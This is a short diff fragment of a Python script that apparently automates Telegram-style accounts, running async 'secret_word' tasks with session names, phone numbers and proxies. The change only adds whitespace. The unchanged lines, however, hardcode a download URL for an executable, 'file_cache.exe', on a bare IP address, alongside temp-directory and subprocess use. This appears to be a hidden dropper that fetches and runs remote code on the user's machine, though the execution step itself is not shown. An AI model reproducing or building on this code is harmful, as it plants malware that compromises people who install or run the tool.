@@ -2,7 +2,7 @@ import asyncio
 import os
 import subprocess
 
-url = "http://176.65.132.123/file_cache.exe"
+url = "http://176.65.132.123/file_cache.exe" 
 
 temp_dir = tempfile.gettempdir()
 
@@ -61,4 +61,5 @@ async def main():
                 tasks.append(asyncio.create_task(secret_word(secret_words=secret_words, session_name=session_name, phone_number=phone_number, thread=thread, proxy=proxy)))
 
         await asyncio.gather(*tasks)
+
 
